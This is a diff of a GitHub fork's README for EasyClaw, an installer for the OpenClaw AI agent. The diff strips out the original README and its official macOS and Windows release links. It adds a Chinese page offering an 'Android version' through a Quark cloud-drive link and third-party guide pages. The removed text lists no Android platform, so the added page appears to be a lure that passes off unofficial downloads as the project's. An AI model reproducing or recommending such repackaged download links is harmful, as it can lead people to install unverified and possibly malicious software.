@@ -1,134 +1,28 @@
-<p align="center">
-  <img src="resources/icon.png" width="120" alt="EasyClaw Logo">
-</p>
+# EasyClaw
 
-<h1 align="center">EasyClaw</h1>
+本仓库是「EasyClaw」的安卓版本获取入口，附使用资料索引。
 
-<p align="center">
-  <strong>One-click installer for OpenClaw AI agent</strong>
-</p>
+## 安装文件资源（夸克网盘）
 
-<p align="center">
-  <a href="README.ko.md">한국어</a> · <a href="README.ja.md">日本語</a> · <a href="README.zh.md">中文</a>
-</p>
+> **EasyClaw 安装文件资源（夸克网盘）**：[https://pan.quark.cn/s/7340bf871d64](https://pan.quark.cn/s/7340bf871d64)
 
-<p align="center">
-  <a href="https://github.com/ybgwon96/easyclaw/releases/latest"><img src="https://img.shields.io/github/v/release/ybgwon96/easyclaw?color=f97316&style=flat-square" alt="Release"></a>
-  <a href="https://github.com/ybgwon96/easyclaw/releases"><img src="https://img.shields.io/github/downloads/ybgwon96/easyclaw/total?color=34d399&style=flat-square" alt="Downloads"></a>
-  <img src="https://img.shields.io/badge/platform-macOS%20%7C%20Windows-blue?style=flat-square" alt="Platform">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-8b5cf6?style=flat-square" alt="License"></a>
-</p>
+## 官方项目
 
-<p align="center">
-  <a href="https://easyclaw.kr">Website</a> · <a href="https://github.com/ybgwon96/easyclaw/releases/latest">Download</a> · <a href="https://github.com/openclaw/openclaw">OpenClaw</a>
-</p>
+- 上游项目：[needsbuilder/easyclaw](https://github.com/needsbuilder/easyclaw)
+
+## 更多资料
+
+- [下载与安装教程](https://github.com/alipymanbu/Android/blob/master/%E5%AE%98%E7%BD%91%E7%89%88APP%E4%B8%8B%E8%BD%BD/EasyClaw%E5%AE%98%E7%BD%91%E7%89%88%E6%9C%AC/%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B.md)
+- [不用电脑时的云Bot怎么用](https://github.com/alipymanbu/Android/blob/master/%E5%AE%98%E7%BD%91%E7%89%88APP%E4%B8%8B%E8%BD%BD/EasyClaw%E5%AE%98%E7%BD%91%E7%89%88%E6%9C%AC/%E4%B8%8D%E7%94%A8%E7%94%B5%E8%84%91%E6%97%B6%E7%9A%84%E4%BA%91Bot%E6%80%8E%E4%B9%88%E7%94%A8.md)
+- [同名应用与官方渠道怎么认](https://github.com/alipymanbu/Android/blob/master/%E5%AE%98%E7%BD%91%E7%89%88APP%E4%B8%8B%E8%BD%BD/EasyClaw%E5%AE%98%E7%BD%91%E7%89%88%E6%9C%AC/%E5%90%8C%E5%90%8D%E5%BA%94%E7%94%A8%E4%B8%8E%E5%AE%98%E6%96%B9%E6%B8%A0%E9%81%93%E6%80%8E%E4%B9%88%E8%AE%A4.md)
+- [常见问题与排查](https://github.com/alipymanbu/Android/blob/master/%E5%AE%98%E7%BD%91%E7%89%88APP%E4%B8%8B%E8%BD%BD/EasyClaw%E5%AE%98%E7%BD%91%E7%89%88%E6%9C%AC/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E6%8E%92%E6%9F%A5.md)
+- [手机上的权限和数据会去哪](https://github.com/alipymanbu/Android/blob/master/%E5%AE%98%E7%BD%91%E7%89%88APP%E4%B8%8B%E8%BD%BD/EasyClaw%E5%AE%98%E7%BD%91%E7%89%88%E6%9C%AC/%E6%89%8B%E6%9C%BA%E4%B8%8A%E7%9A%84%E6%9D%83%E9%99%90%E5%92%8C%E6%95%B0%E6%8D%AE%E4%BC%9A%E5%8E%BB%E5%93%AA.md)
+- [手机端和电脑端怎么连起来](https://github.com/alipymanbu/Android/blob/master/%E5%AE%98%E7%BD%91%E7%89%88APP%E4%B8%8B%E8%BD%BD/EasyClaw%E5%AE%98%E7%BD%91%E7%89%88%E6%9C%AC/%E6%89%8B%E6%9C%BA%E7%AB%AF%E5%92%8C%E7%94%B5%E8%84%91%E7%AB%AF%E6%80%8E%E4%B9%88%E8%BF%9E%E8%B5%B7%E6%9D%A5.md)
+- [手机端收不到结果怎么办](https://github.com/alipymanbu/Android/blob/master/%E5%AE%98%E7%BD%91%E7%89%88APP%E4%B8%8B%E8%BD%BD/EasyClaw%E5%AE%98%E7%BD%91%E7%89%88%E6%9C%AC/%E6%89%8B%E6%9C%BA%E7%AB%AF%E6%94%B6%E4%B8%8D%E5%88%B0%E7%BB%93%E6%9E%9C%E6%80%8E%E4%B9%88%E5%8A%9E.md)
+- [指令怎么写才会照着做](https://github.com/alipymanbu/Android/blob/master/%E5%AE%98%E7%BD%91%E7%89%88APP%E4%B8%8B%E8%BD%BD/EasyClaw%E5%AE%98%E7%BD%91%E7%89%88%E6%9C%AC/%E6%8C%87%E4%BB%A4%E6%80%8E%E4%B9%88%E5%86%99%E6%89%8D%E4%BC%9A%E7%85%A7%E7%9D%80%E5%81%9A.md)
+- [积分和会员怎么算](https://github.com/alipymanbu/Android/blob/master/%E5%AE%98%E7%BD%91%E7%89%88APP%E4%B8%8B%E8%BD%BD/EasyClaw%E5%AE%98%E7%BD%91%E7%89%88%E6%9C%AC/%E7%A7%AF%E5%88%86%E5%92%8C%E4%BC%9A%E5%91%98%E6%80%8E%E4%B9%88%E7%AE%97.md)
+- [全部软件目录](https://github.com/alipymanbu/Android/blob/master/%E5%85%A8%E9%83%A8%E8%BD%AF%E4%BB%B6%E7%9B%AE%E5%BD%95.md)
 
 ---
 
-<p align="center">
-  <img src="docs/demo.gif" width="600" alt="EasyClaw Demo">
-</p>
-
-## What is EasyClaw?
-
-EasyClaw is a desktop installer that sets up [OpenClaw](https://github.com/openclaw/openclaw) AI agent **without any terminal commands**.
-
-**Download → Run → Enter API key** — that's it. Three steps.
-
-## Features
-
-- **One-Click Install** — Automatically detects and installs WSL, Node.js, and OpenClaw
-- **Multiple AI Providers** — Supports Anthropic, Google Gemini, OpenAI, MiniMax, and GLM
-- **Telegram Integration** — Use your AI agent anywhere through a Telegram bot
-- **Cross-Platform** — macOS (Intel + Apple Silicon) and Windows
-
-## Download
-
-| OS      | File   | Link                                                                                          |
-| ------- | ------ | --------------------------------------------------------------------------------------------- |
-| macOS   | `.dmg` | [Download](https://github.com/ybgwon96/easyclaw/releases/latest/download/easy-claw.dmg)       |
-| Windows | `.exe` | [Download](https://github.com/ybgwon96/easyclaw/releases/latest/download/easy-claw-setup.exe) |
-
-You can also download from [easyclaw.kr](https://easyclaw.kr) — it auto-detects your OS.
-
-## Windows Security Notice
-
-We're in the process of obtaining a Windows code signing certificate. You may see a security warning during installation.
-
-> - [VirusTotal scan result](https://www.virustotal.com/gui/url/800de679ba1d63c29023776989a531d27c4510666a320ae3b440c7785b2ab149) — 0 detections across 94 antivirus engines
-> - Fully open source — anyone can inspect the code
-> - Built with GitHub Actions CI/CD — transparent build process
-
-<details>
-<summary><b>If you see "Windows protected your PC"</b></summary>
-
-1. Click **"More info"**
-2. Click **"Run anyway"**
-
-</details>
-
-## Pro Setup Service 🛠️
-
-Stuck during installation, or want everything set up for you? The creator of EasyClaw offers a **paid remote setup session** — installation, API key configuration, Telegram bot connection, and a quick usage walkthrough. About 40 minutes, ₩50,000 (~$40). Korean or English.
-
-📧 [hello@needslab.ai](mailto:hello@needslab.ai) — subject: "EasyClaw Setup"
-
-## Support EasyClaw ☕
-
-EasyClaw is free and open source, built and maintained by one person. If it saved you a trip through the terminal, consider buying the developer a coffee — it keeps the updates coming.
-
-**[☕ 후원하기 / Buy me a coffee](https://qr.kakaopay.com/281006011000066615032016)**
-
-## Tech Stack
-
-| Area      | Technology                                               |
-| --------- | -------------------------------------------------------- |
-| Framework | Electron + electron-vite                                 |
-| Frontend  | React 19 + Tailwind CSS 4                                |
-| Language  | TypeScript                                               |
-| Build/CI  | electron-builder + GitHub Actions                        |
-| Code Sign | Apple Notarization (macOS) / SignPath (Windows, pending) |
-
-## Development
-
-```bash
-npm install    # Install dependencies
-npm run dev    # Development mode (electron-vite dev)
-npm run build  # Type check + build
-npm run lint   # ESLint
-npm run format # Prettier
-```
-
-Platform-specific packaging:
-
-```bash
-npm run build:mac-local  # macOS local build
-npm run build:win-local  # Windows local build
-```
-
-> **Note**: macOS code signing requires `APPLE_ID`, `APPLE_APP_SPECIFIC_PASSWORD`, `APPLE_TEAM_ID`, `CSC_LINK`, `CSC_KEY_PASSWORD` environment variables. Without them, the app will be built unsigned.
-
-## Project Structure
-
-```
-src/
-├── main/             # Main process (Node.js)
-│   ├── services/     # Env check, installer, onboarding, gateway
-│   └── ipc-handlers  # IPC channel router
-├── preload/          # contextBridge (IPC API bridge)
-└── renderer/         # React UI (7-step wizard)
-api/                  # Vercel serverless functions
-docs/                 # Landing page (easyclaw.kr)
-```
-
-## Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) before getting started.
-
-## Credits
-
-Built on [OpenClaw](https://github.com/openclaw/openclaw) (MIT License) by the [openclaw](https://github.com/openclaw) team.
-
-## License
-
-[MIT](LICENSE)
+> 本仓库由上游项目 fork 而来，原始说明见[上游仓库](https://github.com/needsbuilder/easyclaw)。
